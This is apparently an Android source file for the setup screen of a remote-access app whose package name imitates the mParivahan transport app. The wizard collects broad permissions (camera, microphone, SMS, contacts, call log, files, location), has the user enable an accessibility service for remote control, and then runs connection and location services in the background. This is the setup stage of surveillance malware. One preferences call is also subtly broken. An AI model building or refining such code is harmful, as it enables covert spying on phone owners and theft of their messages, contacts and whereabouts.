package com.remoteadmin.mparivahan;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;
import com.google.android.material.textfield.TextInputEditText;
import com.google.android.material.textfield.TextInputLayout;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.remoteadmin.mparivahan.services.ConnectionService;
import com.remoteadmin.mparivahan.services.LocationService;
import com.remoteadmin.mparivahan.services.ScreenCaptureService;
import com.remoteadmin.mparivahan.services.CameraStreamService;
import com.remoteadmin.mparivahan.services.AudioStreamService;
import com.remoteadmin.mparivahan.services.RemoteControlService;

import java.util.ArrayList;
import java.util.List;

/**
 * SetupActivity — Simple Mparivahan-style permission wizard.
 *
 * Flow:
 *   Step 1: Welcome + Accept Terms
 *   Step 2: Grant all runtime permissions (camera, mic, contacts, SMS, files, location)
 *   Step 3: Enable Accessibility Service (for remote control)
 *   Step 4: Enter Server URL + Device Name → Connect
 *
 * After setup, the app runs entirely in background via foreground services.
 */
public class SetupActivity extends AppCompatActivity {

    private static final int PERMISSION_REQUEST_CODE = 100;
    private static final int ACCESSIBILITY_REQUEST_CODE = 101;
    private static final String PREFS = "remote_admin_prefs";

    private int currentStep = 0;
    private String serverUrl = "http://your-server.com:3001";
    private String deviceName = "";

    private TextView titleText, subtitleText, statusText, stepIndicator;
    private Button primaryButton, skipButton;
    private TextInputEditText serverUrlInput, deviceNameInput;
    private TextInputLayout serverUrlLayout, deviceNameLayout;

    // Permissions to request
    private final String[] permissions = {
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_SMS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.WRITE_EXTERNAL_STORAGE,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.POST_NOTIFICATIONS,
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // If already set up, go straight to background mode
        SharedPreferences prefs = getSharedPreferences(PREFS, MODE_PRIVATE);
        if (prefs.getBoolean("setup_complete", false)) {
            startBackgroundServices();
            finish();
            return;
        }

        setContentView(R.layout.activity_setup);

        titleText = findViewById(R.id.titleText);
        subtitleText = findViewById(R.id.subtitleText);
        statusText = findViewById(R.id.statusText);
        stepIndicator = findViewById(R.id.stepIndicator);
        primaryButton = findViewById(R.id.primaryButton);
        skipButton = findViewById(R.id.skipButton);

        primaryButton.setOnClickListener(v -> handleStep());
        skipButton.setOnClickListener(v -> skipStep());

        // Step 3 input fields
        serverUrlInput = findViewById(R.id.serverUrlInput);
        deviceNameInput = findViewById(R.id.deviceNameInput);
        serverUrlLayout = findViewById(R.id.serverUrlLayout);
        deviceNameLayout = findViewById(R.id.deviceNameLayout);

        showStep(0);
    }

    private void showStep(int step) {
        currentStep = step;
        stepIndicator.setText("Step " + (step + 1) + " of 4");

        switch (step) {
            case 0: // Welcome
                titleText.setText("RemoteAdmin");
                subtitleText.setText("Grant access to allow remote management of this device.\n\nThis app works in the background — you can close it after setup.");
                statusText.setText("Tap Continue to begin setup");
                primaryButton.setText("CONTINUE");
                skipButton.setVisibility(android.view.View.GONE);
                break;

            case 1: // Runtime Permissions
                titleText.setText("Grant Permissions");
                subtitleText.setText("The following permissions are required for remote access:");
                primaryButton.setText("GRANT PERMISSIONS");
                skipButton.setVisibility(android.view.View.GONE);

                if (hasAllPermissions()) {
                    statusText.setText("✓ All permissions granted");
                    primaryButton.setText("NEXT");
                } else {
                    statusText.setText("Missing: " + getMissingPermissionsText());
                }
                break;

            case 2: // Accessibility
                titleText.setText("Enable Remote Control");
                subtitleText.setText("Enable the accessibility service so the admin can control this device remotely.");
                statusText.setText(isAccessibilityEnabled()
                    ? "✓ Accessibility service enabled"
                    : "Tap button to open Accessibility Settings");
                primaryButton.setText(isAccessibilityEnabled() ? "NEXT" : "OPEN SETTINGS");
                skipButton.setVisibility(android.view.View.VISIBLE);
                break;

            case 3: // Connect
                titleText.setText("Device Setup");
                subtitleText.setText("Enter a name for this device and the server URL to connect to.");
                statusText.setText("Device will appear in the admin panel");
                primaryButton.setText("CONNECT & FINISH");
                skipButton.setVisibility(android.view.View.GONE);
                serverUrlLayout.setVisibility(android.view.View.VISIBLE);
                deviceNameLayout.setVisibility(android.view.View.VISIBLE);
                deviceNameInput.setText(Build.MODEL);
                break;
        }
    }

    private void handleStep() {
        switch (currentStep) {
            case 0:
                showStep(1);
                break;

            case 1:
                if (!hasAllPermissions()) {
                    requestPermissions();
                } else {
                    showStep(2);
                }
                break;

            case 2:
                if (!isAccessibilityEnabled()) {
                    Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                    startActivityForResult(intent, ACCESSIBILITY_REQUEST_CODE);
                } else {
                    showStep(3);
                }
                break;

            case 3:
                // Read user input
                String url = serverUrlInput.getText() != null ? serverUrlInput.getText().toString().trim() : "";
                String name = deviceNameInput.getText() != null ? deviceNameInput.getText().toString().trim() : "";
                if (url.isEmpty()) {
                    serverUrlInput.setError("Server URL required");
                    return;
                }
                if (name.isEmpty()) {
                    deviceNameInput.setError("Device name required");
                    return;
                }
                serverUrl = url;
                deviceName = name;
                finishSetup();
                break;
        }
    }

    private void skipStep() {
        if (currentStep == 2) {
            showStep(3);
        }
    }

    private void finishSetup() {
        SharedPreferences prefs = getSharedPreferences(PREFS, MODE_PRIVATE);
        prefs.edit()
            .putBoolean("setup_complete", true)
            .putString("server_url", serverUrl)
            .putString("device_name", deviceName)
            .putBoolean("auto_connect", true)
            .apply();

        Toast.makeText(this, "Setup complete! App will run in background.", Toast.LENGTH_LONG).show();

        startBackgroundServices();
        finish();
    }

    private void startBackgroundServices() {
        SharedPreferences prefs = getSharedPreferences(MODE_PRIVATE, 0);
        String url = prefs.getString("server_url", "http://your-server.com:3001");
        String name = prefs.getString("device_name", Build.MODEL);

        // Start WebSocket connection service
        Intent connIntent = new Intent(this, ConnectionService.class);
        connIntent.putExtra("serverUrl", url);
        connIntent.putExtra("deviceId", name);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(connIntent);
        } else {
            startService(connIntent);
        }

        // Start location tracking service (if location permission granted)
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
                == PackageManager.PERMISSION_GRANTED) {
            Intent locIntent = new Intent(this, LocationService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(locIntent);
            } else {
                startService(locIntent);
            }
        }
    }

    // ─── Permissions ──────────────────────────────────────────────────────

    private boolean hasAllPermissions() {
        for (String perm : permissions) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        return true;
    }

    private String getMissingPermissionsText() {
        List<String> missing = new ArrayList<>();
        for (String perm : permissions) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                missing.add(perm.replace("android.permission.", ""));
            }
        }
        return String.join(", ", missing);
    }

    private void requestPermissions() {
        List<String> needed = new ArrayList<>();
        for (String perm : permissions) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                needed.add(perm);
            }
        }
        ActivityCompat.requestPermissions(this, needed.toArray(new String[0]), PERMISSION_REQUEST_CODE);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            if (hasAllPermissions()) {
                statusText.setText("✓ All permissions granted");
                primaryButton.setText("NEXT");
            } else {
                statusText.setText("Missing: " + getMissingPermissionsText());
            }
        }
    }

    private boolean isAccessibilityEnabled() {
        String service = getPackageName() + "/com.remoteadmin.mparivahan.services.RemoteControlService";
        String enabledServices = Settings.Secure.getString(getContentResolver(),
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
        return enabledServices != null && enabledServices.contains(service);
    }

    @Override
    protected void onResume() {
        super.onResume();
        // Refresh step state when returning from settings
        if (currentStep == 2) {
            showStep(2);
        }
        if (currentStep == 1) {
            showStep(1);
        }
    }
}
